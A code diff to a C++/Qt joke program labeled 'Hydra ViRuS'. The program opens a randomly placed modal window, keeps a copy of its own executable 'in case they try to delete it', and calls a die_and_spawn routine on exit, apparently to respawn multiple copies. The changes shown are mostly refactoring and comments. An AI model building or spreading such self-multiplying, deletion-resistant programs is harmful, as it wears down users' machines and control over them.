@@ -19,8 +19,8 @@
 #include <windows.h>
 #endif
 
-#define WIN_WIDTH 500
-#define WIN_HEIGHT 150
+#define WIN_WIDTH 400
+#define WIN_HEIGHT 100
 
 /* XPM */
 const char *hydra_xpm[] = {
@@ -116,22 +116,21 @@ void die_and_spawn(char* exe_name) {
 
 int main(int argc, char* argv[])  {
 
+  // Read in the executable file, in case they try to delete it
   std::ifstream exe_stream(argv[0], std::ifstream::binary);
-  //std::cout << file_length(exe_stream) << std::endl;
   long exe_length = file_length(exe_stream);
   char* exe_buffer = new char[exe_length];
   exe_stream.read(exe_buffer, exe_length);
   exe_stream.close();
 
-  int height = 100;
-  int width = 400;
-
   QApplication::setStyle(QStyleFactory::create("Windows"));
   QApplication app(argc, argv);
+
   QWidget window(NULL, Qt::Window);
   window.setWindowModality(Qt::ApplicationModal);
-  window.setFixedSize(width, height);
+  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);
 
+  // Setup layouts
   QBoxLayout layout(QBoxLayout::TopToBottom);
   QBoxLayout row1(QBoxLayout::LeftToRight);
   QBoxLayout row2(QBoxLayout::LeftToRight);
@@ -139,13 +138,16 @@ int main(int argc, char* argv[])  {
   row1.setSpacing(0);
   row2.setSpacing(0);
 
+  // Create hydra icon
   QLabel image(&window);
   image.setPixmap(QPixmap(hydra_xpm));
   image.move(10,10);
 
+  // Create message text
   QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
   text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);
 
+  // Create the button
   QPushButton button;
   button.setFixedSize(96, 26);
   button.setDefault(true);
@@ -158,15 +160,15 @@ int main(int argc, char* argv[])  {
   int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
   window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);
 
-  //row1.addWidget(&image);
+  // Glue everything together
   row1.addWidget(&text, Qt::AlignLeft);
   row2.addWidget(&button, Qt::AlignHCenter);
   layout.addLayout(&row1);
   layout.addLayout(&row2);
 
-  window.show();
+  // Start
   window.setLayout(&layout);
-
+  window.show();
   app.exec();
 
   die_and_spawn(argv[0]);
